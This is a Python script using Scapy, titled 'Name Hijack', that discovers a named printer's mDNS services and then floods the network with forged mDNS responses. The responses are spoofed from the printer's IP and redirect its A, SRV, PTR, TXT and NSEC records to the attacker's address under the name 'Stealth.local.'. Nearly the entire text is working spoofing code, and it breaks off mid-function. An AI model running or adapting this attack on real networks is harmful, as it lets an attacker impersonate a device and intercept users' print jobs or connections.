
#### Name Hijack
from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE
import netifaces
import scapy.all as sa
import scapy.layers as sl
import copy
my_ip=netifaces.ifaddresses('eth0')[AF_INET][0]['addr']
printer="169.254.169.190"
#legit="169.254.7.23"
#priter_rev="190.169.254.169.in-addr.arpa."
#my_rev="254.253.254.169.in-addr.arpa."
#name="HPB00CD1D2A9BE-440.local."
services=set()
services2=set()
#printer="192.168.1.123"
my_rev=""
printer_rev=""
interface="eth0"
def prt(packet):
    global services
    global sniffer
    if sa.DNS in packet and packet[sa.DNS].ancount!=0:
        for i in range(packet[sa.DNS].ancount):
            services.add(packet[sa.DNS].an[i].rdata.decode("utf-8"))
            global printer
            global my_rev
            global printer_rev
            #printer=packet[sa.IP].src
            my_rev=".".join(my_ip.split(".")[::-1])+".in-addr.arpa."
            printer_rev=".".join(printer.split(".")[::-1])+".in-addr.arpa."

name=""

resp=False

sniffer=sa.AsyncSniffer(filter="src host "+printer,prn=prt,iface=interface)
sniffer.start()
sa.send(sa.IP(src=my_ip,dst="224.0.0.251")/sa.UDP(sport=5353,dport=5353)/sa.DNS(qr=0,rd=0,qd=sa.DNSQR(qname="_services._dns-sd._udp.local",qtype="PTR",qclass=32769)),iface=interface)
#sa.send(sa.IP(src=my_ip,dst="224.0.0.251")/sa.UDP(sport=5353,dport=5353)/sa.DNS(qdcount=1,rd=0,qd=sa.DNSQR(qname="_services._dns-sd._udp.local",qtype="PTR",qclass=32769)))
#sa.send(sa.IP(src=my_ip,dst="224.0.0.251")/sa.UDP(sport=5353,dport=5353)/sa.DNS(qdcount=1,rd=0,qd=sa.DNSQR(qname="_services._dns-sd._udp.local",qtype="PTR",qclass=32769)))
time.sleep(0.5)
print("Querying services")
while(len(services)==0):
    sa.send(sa.IP(src=my_ip,dst="224.0.0.251")/sa.UDP(sport=5353,dport=5353)/sa.DNS(qr=0,rd=0,qd=sa.DNSQR(qname="_services._dns-sd._udp.local",qtype="PTR",qclass=32769)),iface=interface)
    time.sleep(1)
sniffer.stop()
print(printer)
packet=sa.IP(src=my_ip,dst="224.0.0.251")/sa.UDP(sport=5353,dport=5353)/sa.DNS(qr=0,rd=0)
L=list(services)
print (L)
i=1
packet[sa.DNS].qd=sa.DNSQR(qname=L[0],qtype="PTR",qclass=32769)
name="Stealth.local."
current_name=""
for i in range(1,len(L)):
    packet[sa.DNS].qd=packet[sa.DNS].qd/sa.DNSQR(qname=L[i],qtype="PTR",qclass=32769)
def find_name(packet):
    for i in range(packet[sa.DNS].ancount):
        if packet[sa.DNS].an[i].type==33:
            return packet[sa.DNS].ar[i].target.decode("utf-8")
    for i in range(packet[sa.DNS].arcount):
        if packet[sa.DNS].ar[i].type==33:
            return packet[sa.DNS].ar[i].target.decode("utf-8")
    for i in range(packet[sa.DNS].nscount):
        if packet[sa.DNS].ns[i].type==33:
            return packet[sa.DNS].ar[i].target.decode("utf-8")
def change_txt(rdata):
    global name
    global current_name
    tmp_list=[i.decode("utf-8") for i in rdata]
    for i in range(len(tmp_list)):
        p=tmp_list[i].find(current_name)
        if p != -1:
            tmp_list[i]=tmp_list[i][:p]+name+tmp_list[i][p+len(current_name):]
    return [i.encode("utf-8") for i in tmp_list]
def fake(packet):
    global current_name
    global resp
    #print(packet[sa.Ether].src)
    if packet[sa.Ether].src=="e8:6a:64:77:86:aa":
        return None
    if sa.IP in packet and sa.DNS in packet :
        global interface
        if packet[sa.IP].src==printer:
            if current_name=="":
                current_name=find_name(packet)
                print("Current Name:",current_name)
            forged_packet=sa.IP(src=printer,dst="224.0.0.251")/sa.UDP(sport=5353,dport=5353)/sa.DNS(qr=1,aa=1,rd=0)
            if (packet[sa.DNS].qdcount)!=0:
                return None
              #  if  packet[sa.DNS].qd[i].qtype==1 :
                #     if forged_packet[sa.DNS].qdcount==0:
                #         forged_packet[sa.DNS].qd=sa.DNSQR(qname=name,qtype=1,qclass=32769)
                #     else:
                #         forged_packet[sa.DNS].qd=forged_packet[sa.DNS].qd/sa.DNSQR(qname=name,qtype=1,qclass=32769)
                #         forged_packet[sa.DNS].qdcount+=1
                # else:
                #     if forged_packet[sa.DNS].qdcount==0:
                #         forged_packet[sa.DNS].qd=sa.DNSQR(qname=packet[sa.DNS].qd[i].qname,qtype=packet[sa.DNS].qd[i].qtype,qclass=32769)
                #     else:
                #         forged_packet[sa.DNS].qd=forged_packet[sa.DNS].qd/sa.DNSQR(qname=packet[sa.DNS].qd[i].qname,qtype=packet[sa.DNS].qd[i].qtype,qclass=32769)
                #         forged_packet[sa.DNS].qdcount+=1

            #Answer records
            for i in range(packet[sa.DNS].ancount):
                if  packet[sa.DNS].an[i].type==1 :
                    if forged_packet[sa.DNS].ancount==0:
                        forged_packet[sa.DNS].an=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
                    else:
                        forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
                 #       forged_packet[sa.DNS].ancount+=1
                elif  packet[sa.DNS].an[i].type==33 :
                    if forged_packet[sa.DNS].ancount==0:
                        forged_packet[sa.DNS].an=sa.DNSRRSRV(rrname=packet[sa.DNS].an[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].an[i].port,target=name.encode("utf-8"))
                    else:
                        forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRRSRV(rrname=packet[sa.DNS].an[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].an[i].port,target=name.encode("utf-8"))
                #        forged_packet[sa.DNS].ancount+=1
                elif  packet[sa.DNS].an[i].type==12 and packet[sa.DNS].an[i].rrname.decode("utf-8")==printer_rev:
                    if forged_packet[sa.DNS].ancount==0:
                        forged_packet[sa.DNS].an=sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))
                    else:
                        forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))
               #         forged_packet[sa.DNS].ancount+=1
                elif packet[sa.DNS].an[i].type==16:
                    if forged_packet[sa.DNS].ancount==0:
                        forged_packet[sa.DNS].an=sa.DNSRR(rrname=packet[sa.DNS].an[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].an[i].rdata))
                    else:
                        forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=packet[sa.DNS].an[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].an[i].rdata))
                elif packet[sa.DNS].an[i].type==12:
                    if forged_packet[sa.DNS].ancount==0:
                        forged_packet[sa.DNS].an=sa.DNSRR(rrname=packet[sa.DNS].an[i].rrname,type=12,rclass=32769,ttl=120,rdata=packet[sa.DNS].an[i].rdata)
                    else:
                        forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=packet[sa.DNS].an[i].rrname,type=12,rclass=32769,ttl=120,rdata=packet[sa.DNS].an[i].rdata)
              #          forged_packet[sa.DNS].ancount+=1
                elif packet[sa.DNS].an[i].type==47:
                    for typebit in sl.dns.bitmap2RRlist(packet[sa.DNS].an[i].typebitmaps):
                        if typebit==1:
                            if forged_packet[sa.DNS].ancount==0:
                                forged_packet[sa.DNS].an=sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                            else:
                                forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
             #                   forged_packet[sa.DNS].ancount+=1
                        elif typebit==12:
                            if forged_packet[sa.DNS].ancount==0:
                                forged_packet[sa.DNS].an=sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])
                            else:
                                forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])
                   #             forged_packet[sa.DNS].ancount+=1
                        else:
                            if forged_packet[sa.DNS].ancount==0:
                                forged_packet[sa.DNS].an=sa.DNSRRNSEC(rrname=packet[sa.DNS].an[i].rrname,nextname=packet[sa.DNS].an[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].an[i].typebitmaps)
                            else:
                                forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRRNSEC(rrname=packet[sa.DNS].an[i].rrname,nextname=packet[sa.DNS].an[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].an[i].typebitmaps)
                          #      forged_packet[sa.DNS].ancount+=1                          



            ##Additionnal Records
            for i in range(packet[sa.DNS].arcount):
                if  packet[sa.DNS].ar[i].type==1 :
                    if forged_packet[sa.DNS].arcount==0:
                        forged_packet[sa.DNS].ar=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)

                    else:
                        forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
             #           forged_packet[sa.DNS].arcount+=1
                elif  packet[sa.DNS].ar[i].type==33 :
                    if forged_packet[sa.DNS].arcount==0:
                        forged_packet[sa.DNS].ar=sa.DNSRRSRV(rrname=packet[sa.DNS].ar[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ar[i].port,target=name.encode("utf-8"))
                 #       forged_packet[sa.DNS].arcount+=1
                    else:
                        forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRSRV(rrname=packet[sa.DNS].ar[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ar[i].port,target=name.encode("utf-8"))
              #          forged_packet[sa.DNS].arcount+=1
                elif  packet[sa.DNS].ar[i].type==12 and packet[sa.DNS].ar[i].rrname.decode("utf-8")==printer_rev:
                    if forged_packet[sa.DNS].arcount==0:
                        forged_packet[sa.DNS].ar=sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))

                    else:
                        forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))
             #           forged_packet[sa.DNS].arcount+=1
                elif packet[sa.DNS].ar[i].type==12:
                    if forged_packet[sa.DNS].arcount==0:
                        forged_packet[sa.DNS].ar=sa.DNSRR(rrname=packet[sa.DNS].ar[i].rrname,type=12,rclass=32769,ttl=120,rdata=packet[sa.DNS].ar[i].rdata)

                    else:
                        forged_packet[sa.DNS].ar=forged_packet[sa.DNS].an/sa.DNSRR(rrname=packet[sa.DNS].ar[i].rrname,type=12,rclass=32769,ttl=120,rdata=packet[sa.DNS].ar[i].rdata)
            #            forged_packet[sa.DNS].arcount+=1
                elif packet[sa.DNS].ar[i].type==16:
                    if forged_packet[sa.DNS].arcount==0:
                        forged_packet[sa.DNS].ar=sa.DNSRR(rrname=packet[sa.DNS].ar[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ar[i].rdata))
                    else:
                        forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRR(rrname=packet[sa.DNS].ar[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ar[i].rdata))
                elif packet[sa.DNS].ar[i].type==47:
                    for typebit in sl.dns.bitmap2RRlist(packet[sa.DNS].ar[i].typebitmaps):
                        if typebit==1:
                            if forged_packet[sa.DNS].arcount==0:
                                forged_packet[sa.DNS].ar=sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])

                            else:
                                forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                       #         forged_packet[sa.DNS].arcount+=1
                            break
                        elif typebit==12:
                            if forged_packet[sa.DNS].arcount==0:
                                forged_packet[sa.DNS].ar=sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])

                            else:
                                forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])
                          #      forged_packet[sa.DNS].arcount+=1
                            break
                        else:
                            if forged_packet[sa.DNS].arcount==0:
                                forged_packet[sa.DNS].ar=sa.DNSRRNSEC(rrname=packet[sa.DNS].ar[i].rrname,nextname=packet[sa.DNS].ar[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].ar[i].typebitmaps)

                            else:
                                forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRNSEC(rrname=packet[sa.DNS].ar[i].rrname,nextname=packet[sa.DNS].ar[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].ar[i].typebitmaps)
                      #          forged_packet[sa.DNS].arcount+=1  
                            break

            #authority Records
            for i in range(packet[sa.DNS].nscount):
                if  packet[sa.DNS].ns[i].type==1 :
                    if forged_packet[sa.DNS].nscount==0:
                        forged_packet[sa.DNS].ns=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)

                    else:
                        forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
                     #   forged_packet[sa.DNS].ancount+=1
                elif  packet[sa.DNS].ns[i].type==33 :
                    if forged_packet[sa.DNS].nscount==0:
                        forged_packet[sa.DNS].ns=sa.DNSRRSRV(rrname=packet[sa.DNS].ns[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ns[i].port,target=name.encode("utf-8"))

                    else:
                        forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRRSRV(rrname=packet[sa.DNS].ns[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ns[i].port,target=name.encode("utf-8"))
                     #   forged_packet[sa.DNS].nscount+=1
                elif  packet[sa.DNS].ns[i].type==12 and packet[sa.DNS].ns[i].rrname.decode("utf-8")==printer_rev:
                    if forged_packet[sa.DNS].nscount==0:
                        forged_packet[sa.DNS].ns=sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))

                    else:
                        forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))
                   #     forged_packet[sa.DNS].nscount+=1
                elif packet[sa.DNS].ns[i].type==12:
                    if forged_packet[sa.DNS].nscount==0:
                        forged_packet[sa.DNS].ns=sa.DNSRR(rrname=packet[sa.DNS].ns[i].rrname,type=12,rclass=32769,ttl=120,rdata=packet[sa.DNS].ns[i].rdata)

                    else:
                        forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=packet[sa.DNS].ns[i].rrname,type=12,rclass=32769,ttl=120,rdata=packet[sa.DNS].ns[i].rdata)
                   #     forged_packet[sa.DNS].nscount+=1
                elif packet[sa.DNS].ns[i].type==16:
                    if forged_packet[sa.DNS].nscount==0:
                        forged_packet[sa.DNS].ns=sa.DNSRR(rrname=packet[sa.DNS].ns[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ns[i].rdata))
                    else:
                        forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=packet[sa.DNS].ns[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ns[i].rdata))
                elif packet[sa.DNS].ns[i].type==47:
                    for typebit in sl.dns.bitmap2RRlist(packet[sa.DNS].ns[i].typebitmaps):
                        if typebit==1:
                            if forged_packet[sa.DNS].nscount==0:
                                forged_packet[sa.DNS].ns=sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])

                            else:
                                forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                          #      forged_packet[sa.DNS].nscount+=1
                        elif typebit==12:
                            if forged_packet[sa.DNS].nscount==0:
                                forged_packet[sa.DNS].ns=sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])

                            else:
                                forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])
                              #  forged_packet[sa.DNS].nscount+=1
                        else:
                            if forged_packet[sa.DNS].nscount==0:
                                forged_packet[sa.DNS].ns=sa.DNSRRNSEC(rrname=packet[sa.DNS].ns[i].rrname,nextname=packet[sa.DNS].ns[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].an[i].typebitmaps)

                            else:
                                forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRRNSEC(rrname=packet[sa.DNS].ns[i].rrname,nextname=packet[sa.DNS].ns[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].ns[i].typebitmaps)
                          #      forged_packet[sa.DNS].nscount+=1  
            #forged_packet[sa.DNS].show()
            del forged_packet.chksum
            sa.send(forged_packet,iface=interface)
            sa.send(forged_packet,iface=interface)
            time.sleep(0.5)
            sa.send(forged_packet,iface=interface)
            resp=True
        else:
            if packet[sa.DNS].qd!=0:
                packet[sa.DNS].show()
                forged_packet=sa.IP(src=printer,dst="224.0.0.251")/sa.UDP(sport=5353,dport=5353)/sa.DNS(qr=1,aa=1,rd=0)
                for q in range(packet[sa.DNS].qdcount):
                   if packet[sa.DNS].qd[q].qname.decode("utf-8")==name:
                       forged_packet[sa.DNS].an=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
                       forged_packet[sa.DNS].ar=sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                     #  del forged_packet.chksum
                      # sa.send(forged_packet,iface=interface)
                    #   sa.send(forged_packet,iface=interface)
                       
                     #  resp=True
                      # break
                for i in range(packet[sa.DNS].ancount):
                    if  packet[sa.DNS].an[i].type==1 :
                        if forged_packet[sa.DNS].ancount==0:
                            forged_packet[sa.DNS].an=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
                        else:
                            forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
                    #       forged_packet[sa.DNS].ancount+=1
                    elif  packet[sa.DNS].an[i].type==33 :
                        if forged_packet[sa.DNS].ancount==0:
                            forged_packet[sa.DNS].an=sa.DNSRRSRV(rrname=packet[sa.DNS].an[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].an[i].port,target=name.encode("utf-8"))
                        else:
                            forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRRSRV(rrname=packet[sa.DNS].an[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].an[i].port,target=name.encode("utf-8"))
                    #        forged_packet[sa.DNS].ancount+=1
                    elif  packet[sa.DNS].an[i].type==12 and packet[sa.DNS].an[i].rrname.decode("utf-8")==printer_rev:
                        if forged_packet[sa.DNS].ancount==0:
                            forged_packet[sa.DNS].an=sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))
                        else:
                            forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))
                #         forged_packet[sa.DNS].ancount+=1
                    elif packet[sa.DNS].an[i].type==16:
                        if forged_packet[sa.DNS].ancount==0:
                            forged_packet[sa.DNS].an=sa.DNSRR(rrname=packet[sa.DNS].an[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].an[i].rdata))
                        else:
                            forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=packet[sa.DNS].an[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].an[i].rdata))
                    elif packet[sa.DNS].an[i].type==12:
                        if forged_packet[sa.DNS].ancount==0:
                            forged_packet[sa.DNS].an=sa.DNSRR(rrname=packet[sa.DNS].an[i].rrname,type=12,rclass=32769,ttl=120,rdata=packet[sa.DNS].an[i].rdata)
                        else:
                            forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRR(rrname=packet[sa.DNS].an[i].rrname,type=12,rclass=32769,ttl=120,rdata=packet[sa.DNS].an[i].rdata)
                #          forged_packet[sa.DNS].ancount+=1
                    elif packet[sa.DNS].an[i].type==47:
                        for typebit in sl.dns.bitmap2RRlist(packet[sa.DNS].an[i].typebitmaps):
                            if typebit==1:
                                if forged_packet[sa.DNS].ancount==0:
                                    forged_packet[sa.DNS].an=sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                                else:
                                    forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                #                   forged_packet[sa.DNS].ancount+=1
                            elif typebit==12:
                                if forged_packet[sa.DNS].ancount==0:
                                    forged_packet[sa.DNS].an=sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])
                                else:
                                    forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])
                    #             forged_packet[sa.DNS].ancount+=1
                            else:
                                if forged_packet[sa.DNS].ancount==0:
                                    forged_packet[sa.DNS].an=sa.DNSRRNSEC(rrname=packet[sa.DNS].an[i].rrname,nextname=packet[sa.DNS].an[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].an[i].typebitmaps)
                                else:
                                    forged_packet[sa.DNS].an=forged_packet[sa.DNS].an/sa.DNSRRNSEC(rrname=packet[sa.DNS].an[i].rrname,nextname=packet[sa.DNS].an[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].an[i].typebitmaps)
                            #      forged_packet[sa.DNS].ancount+=1                          



                ##Additionnal Records
                for i in range(packet[sa.DNS].arcount):
                    if  packet[sa.DNS].ar[i].type==1 :
                        if forged_packet[sa.DNS].arcount==0:
                            forged_packet[sa.DNS].ar=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)

                        else:
                            forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
                #           forged_packet[sa.DNS].arcount+=1
                    elif  packet[sa.DNS].ar[i].type==33 :
                        if forged_packet[sa.DNS].arcount==0:
                            forged_packet[sa.DNS].ar=sa.DNSRRSRV(rrname=packet[sa.DNS].ar[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ar[i].port,target=name.encode("utf-8"))
                    #       forged_packet[sa.DNS].arcount+=1
                        else:
                            forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRSRV(rrname=packet[sa.DNS].ar[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ar[i].port,target=name.encode("utf-8"))
                #          forged_packet[sa.DNS].arcount+=1
                    elif  packet[sa.DNS].ar[i].type==12 and packet[sa.DNS].ar[i].rrname.decode("utf-8")==printer_rev:
                        if forged_packet[sa.DNS].arcount==0:
                            forged_packet[sa.DNS].ar=sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))

                        else:
                            forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))
                #           forged_packet[sa.DNS].arcount+=1
                    elif packet[sa.DNS].ar[i].type==12:
                        if forged_packet[sa.DNS].arcount==0:
                            forged_packet[sa.DNS].ar=sa.DNSRR(rrname=packet[sa.DNS].ar[i].rrname,type=12,rclass=32769,ttl=120,rdata=packet[sa.DNS].ar[i].rdata)

                        else:
                            forged_packet[sa.DNS].ar=forged_packet[sa.DNS].an/sa.DNSRR(rrname=packet[sa.DNS].ar[i].rrname,type=12,rclass=32769,ttl=120,rdata=packet[sa.DNS].ar[i].rdata)
                #            forged_packet[sa.DNS].arcount+=1
                    elif packet[sa.DNS].ar[i].type==16:
                        if forged_packet[sa.DNS].arcount==0:
                            forged_packet[sa.DNS].ar=sa.DNSRR(rrname=packet[sa.DNS].ar[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ar[i].rdata))
                        else:
                            forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRR(rrname=packet[sa.DNS].ar[i].rrname,type=16,rclass=32769,ttl=120,rdata=change_txt(packet[sa.DNS].ar[i].rdata))
                    elif packet[sa.DNS].ar[i].type==47:
                        for typebit in sl.dns.bitmap2RRlist(packet[sa.DNS].ar[i].typebitmaps):
                            if typebit==1:
                                if forged_packet[sa.DNS].arcount==0:
                                    forged_packet[sa.DNS].ar=sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])

                                else:
                                    forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRNSEC(rrname=name.encode("utf-8"),nextname=name.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[1])
                        #         forged_packet[sa.DNS].arcount+=1
                                break
                            elif typebit==12:
                                if forged_packet[sa.DNS].arcount==0:
                                    forged_packet[sa.DNS].ar=sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])

                                else:
                                    forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRNSEC(rrname=my_rev.encode("utf-8"),nextname=my_rev.encode("utf-8"),rclass=32769,ttl=120,typebitmaps=[12])
                            #      forged_packet[sa.DNS].arcount+=1
                                break
                            else:
                                if forged_packet[sa.DNS].arcount==0:
                                    forged_packet[sa.DNS].ar=sa.DNSRRNSEC(rrname=packet[sa.DNS].ar[i].rrname,nextname=packet[sa.DNS].ar[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].ar[i].typebitmaps)

                                else:
                                    forged_packet[sa.DNS].ar=forged_packet[sa.DNS].ar/sa.DNSRRNSEC(rrname=packet[sa.DNS].ar[i].rrname,nextname=packet[sa.DNS].ar[i].nextname,rclass=32769,ttl=120,typebitmaps=packet[sa.DNS].ar[i].typebitmaps)
                        #          forged_packet[sa.DNS].arcount+=1  
                                break

                #authority Records
                for i in range(packet[sa.DNS].nscount):
                    if  packet[sa.DNS].ns[i].type==1 :
                        if forged_packet[sa.DNS].nscount==0:
                            forged_packet[sa.DNS].ns=sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)

                        else:
                            forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=name,type=1,rclass=32769,ttl=120,rdata=my_ip)
                        #   forged_packet[sa.DNS].ancount+=1
                    elif  packet[sa.DNS].ns[i].type==33 :
                        if forged_packet[sa.DNS].nscount==0:
                            forged_packet[sa.DNS].ns=sa.DNSRRSRV(rrname=packet[sa.DNS].ns[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ns[i].port,target=name.encode("utf-8"))

                        else:
                            forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRRSRV(rrname=packet[sa.DNS].ns[i].rrname,type=33,rclass=32769,ttl=120,priority=0,weight=100,port=packet[sa.DNS].ns[i].port,target=name.encode("utf-8"))
                        #   forged_packet[sa.DNS].nscount+=1
                    elif  packet[sa.DNS].ns[i].type==12 and packet[sa.DNS].ns[i].rrname.decode("utf-8")==printer_rev:
                        if forged_packet[sa.DNS].nscount==0:
                            forged_packet[sa.DNS].ns=sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))

                        else:
                            forged_packet[sa.DNS].ns=forged_packet[sa.DNS].ns/sa.DNSRR(rrname=my_rev.encode("utf-8"),type=12,rclass=32769,ttl=120,rdata=name.encode("utf-8"))
                    #     forged_packet[sa.DNS].nscount+=1
                    elif packet[sa.DNS].ns[i].type==12:
